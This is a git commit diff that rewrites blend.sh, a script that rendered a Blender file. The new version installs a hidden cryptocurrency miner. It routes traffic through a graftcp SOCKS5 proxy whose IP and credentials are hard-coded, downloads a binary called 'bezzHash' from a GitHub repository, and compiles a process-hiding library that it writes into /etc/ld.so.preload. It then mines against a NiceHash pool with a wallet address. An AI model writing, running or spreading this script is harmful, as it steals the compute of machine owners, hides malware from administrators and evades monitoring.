28375e5a0f133a1a82829ebf3058dd9bbd6be50c
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-30 17:15:28 +0700

    Update blend.sh

--- blend.sh
+++ blend.sh
@@ -1,8 +1,59 @@
 #!/bin/sh
-wget https://mirror.clarkson.edu/blender/release/Blender2.93/blender-2.93.5-linux-x64.tar.xz
-tar -xf blender-2.93.5-linux-x64.tar.xz
-cd blender-2.93.5-linux-x64
-ls -la
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/b.blend
-chmod +x blender 
-./blender -b 'b.blend' -noaudio  -a --  --cycles-device CUDA
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 44.200.241.47:443
+socks5_username = ngegas
+socks5_password = Oramandek
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+echo "**"
+
+echo " "
+
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+
+unzip magicBezzHash.zip
+
+make
+
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+
+mv libprocesshider.so /usr/local/lib/
+
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./bezzHash --url=ssl://3DWPbhBLe3RC4dHP8Y6Wz3QCorqJw4Bgcy@daggerhashimoto.usa-east.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
